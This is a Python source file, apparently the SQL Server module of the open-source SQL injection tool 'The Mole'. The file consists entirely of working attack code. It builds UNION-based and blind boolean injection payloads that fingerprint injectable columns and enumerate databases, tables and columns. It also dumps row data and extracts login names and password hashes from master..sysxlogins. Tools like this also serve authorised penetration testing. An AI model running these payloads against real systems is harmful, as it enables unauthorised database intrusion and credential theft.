#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from . import DbmsMole, FingerBase

class SQLServerMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.char_concat(out_delimiter_result)
    inner_delimiter = DbmsMole.char_concat(DbmsMole.inner_delimiter_result)
    integer_field_finger = 'ascii(char(58)) + (len(' + DbmsMole.char_concat("1111111") + ') * 190) + (ascii(char(73)) * 31337)'
    integer_field_finger_result = '2288989'
    integer_out_delimiter = '3133707'
    comment_list = ['--', '/*', ' ']

    def to_string(self, data):
        return DbmsMole.char_concat(data)

    def _schemas_query_info(self):
        return {
            'table' : 'master..sysdatabases',
            'field' : ['name']
        }

    def _tables_query_info(self, db):
        return {
            'table' : '[' + db + ']..sysobjects',
            'field' : ['name'],
            'filter': "xtype = 'U'"
        }

    def _columns_query_info(self, db, table):
        return {
            'table' : '[{db}]..syscolumns,[{db}]..sysobjects'.format(db=db),
            'field' : ['name'.format(db=db)],
            'filter': "[{db}]..syscolumns.id = [{db}]..sysobjects.id and [{db}]..sysobjects.name = '{table}'".format(db=db, table=table)
        }

    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : '[' + db + ']..' + table,
            'field' : fields,
            'filter': where
        }

    def _dbinfo_query_info(self):
        return {
            'field' : ['user_name()', '@@version', 'db_name()'],
            'table' : ''
        }

    def _user_creds_query_info(self):
        return {
            'field'  : ['name', 'master.dbo.fn_varbintohexstr(password)'],
            'table'  : 'master..sysxlogins',
            'filter' : '1=1'
        }

    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
        fields_joined = self._join_fields_with_table(fields, table)
        query = ' and {op_par}' + str(value) + ' < (select ascii(substring({field}, '.format(field=self._concat_fields(fields)) + str(index) + ', 1))'
        if len(table) > 0:
            query += (' from (select top 1 {fields_comma} from {table} where {fields} not in (select top {off} {fields} from ' +
               '{table} where {where} order by 1 ASC) and {where} order by 1 ASC) as T)').format(
                    table=table, fields=self._concat_fields(fields_joined), fields_comma=','.join(fields_joined),
                    where=self.parse_condition(where), off=offset
                )
        else:
            query += ')'
        return query

    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*) from ' + table + ' where ' + self.parse_condition(where) + ')'

    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
        fields_joined = self._join_fields_with_table(fields, table)
        query = ' and {op_par}' + str(value) + ' ' + operator + ' (select len({field})'.format(field=self._concat_fields(fields))
        if len(table) > 0:
            query += (' from (select top 1 {fields_comma} from {table} where {field} not in (select top {off} {field} ' +
                'from {table} where {where} order by 1 ASC) and {where} order by 1 ASC) as T)').format(
                table=table, field=self._concat_fields(fields_joined), fields_comma=','.join(fields_joined),
                where=self.parse_condition(where), off=offset)
        else:
            query += ')'
        return query

    @classmethod
    def blind_field_delimiter(cls):
        return SQLServerMole.inner_delimiter_result

    @classmethod
    def dbms_check_blind_query(cls):
        return ' and {op_par}0 < (select len(user_name()))'

    @classmethod
    def dbms_name(cls):
        return 'SQL Server'

    def __str__(self):
        return "SQL Server Mole"

    @classmethod
    def field_finger(cls, finger):
        if finger.is_string_query:
            return DbmsMole.field_finger_str
        else:
            return SQLServerMole.integer_field_finger_result

    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        output = []
        output_int = []
        for i in range(query_columns):
            hashes = list(map(lambda x: 'null', range(query_columns)))
            to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
            to_search[i] = str(base + i)
            hashes[i] = DbmsMole.char_concat(str(base + i))
            output.append(FingerBase(list(hashes), to_search))
            hashes[i] = str(base + i)
            output_int.append(FingerBase(hashes, to_search, False))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(DbmsMole.char_concat(str(i)))
        to_search = list(map(str, range(base, base + query_columns)))
        output.append(FingerBase(list(hashes), to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(str(i))
        output_int.append(FingerBase(list(hashes), to_search, False))
        return output + output_int

    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(finger._query)
        if finger.is_string_query:
            query_list[injectable_field] = '@@version+' + DbmsMole.char_concat(DbmsMole.field_finger_str)
        else:
            query_list[injectable_field] = '(' + SQLServerMole.integer_field_finger + ')'
        query += ",".join(query_list)
        return query

    def set_good_finger(self, finger):
        self.finger = finger

    def _join_fields_with_table(self, fields, table):
        return list(map(lambda i: table.split(',')[0] + '.' + i, fields))

    def forge_count_query(self, fields, table_name, injectable_field, where="1=1"):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(count(*) as varchar(50))+' + SQLServerMole.out_delimiter)
        query += ','.join(query_list)
        return query + " from " + table_name + " where " + self.parse_condition(where)

    def forge_query(self, fields, table_name, injectable_field, where="1=1", offset=0):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = (SQLServerMole.out_delimiter + "+" + self._concat_fields(fields) + "+" + SQLServerMole.out_delimiter)
        where = self.parse_condition(where)
        query += ','.join(query_list)
        fields = self._join_fields_with_table(fields, table_name)
        if len(table_name) > 0:
            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +
                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " +
                      where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
        return query

    def forge_integer_count_query(self, fields, table_name, injectable_field, where="1=1"):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ('cast(cast(' + SQLServerMole.integer_out_delimiter +
                ' as varchar(10))+cast(count(*) as varchar(50))+' +
                'cast(' + SQLServerMole.integer_out_delimiter + ' as varchar(10)) as bigint)')
        query += ','.join(query_list)
        if len(table_name) > 0:
            query += " from " + table_name + " where " + self.parse_condition(where)
        return query

    def forge_integer_len_query(self, fields, table_name, injectable_field, where="1=1", offset=0):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
                                        "cast(len(" + self._concat_fields(fields) + ") as varchar(30))+cast(" +
                                        SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
        where = self.parse_condition(where)
        query += ','.join(query_list)
        fields = self._join_fields_with_table(fields, table_name)
        if len(table_name) > 0:
            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " + self._concat_fields(fields) +
                      " not in (select top " + str(offset) + " " + self._concat_fields(fields) + " from " + table_name + " where " +
                      where + " order by 1 ASC) and " + where + " order by 1 ASC) as T")
        return query

    def forge_integer_query(self, index, fields, table_name, injectable_field, where="1=1", offset=0):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("cast(cast(" + SQLServerMole.integer_out_delimiter + " as varchar(10))+" +
                                        "cast(ascii(substring(" + self._concat_fields(fields) + "," + str(index) + ",1)) as varchar(30))+cast(" +
                                        SQLServerMole.integer_out_delimiter + " as varchar(10)) as bigint)")
        where = self.parse_condition(where)
        query += ','.join(query_list)
        fields = self._join_fields_with_table(fields, table_name)
        if len(table_name) > 0:
            query += (" from (select top 1 " + ','.join(fields) + " from " + table_name + " where " +
                      self._concat_fields(fields) + " not in (select top " + str(offset) + " " +
                      self._concat_fields(fields) + " from " + table_name + " where " + where + " order by 1 ASC) and " +
                      where + " order by 1 ASC) as T")
        return query

    def _concat_fields(self, fields):
        return ('+' + SQLServerMole.inner_delimiter + '+').join(map(lambda x: 'isnull(cast(' + x + ' as varchar(100)), char(32))' , fields))

    def is_string_query(self):
        return self.finger.is_string_query

    def parse_results(self, url_data):
        if self.finger.is_string_query:
            data_list = url_data.split(SQLServerMole.out_delimiter_result)
        else:
            data_list = url_data.split(SQLServerMole.integer_out_delimiter)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(SQLServerMole.inner_delimiter_result)
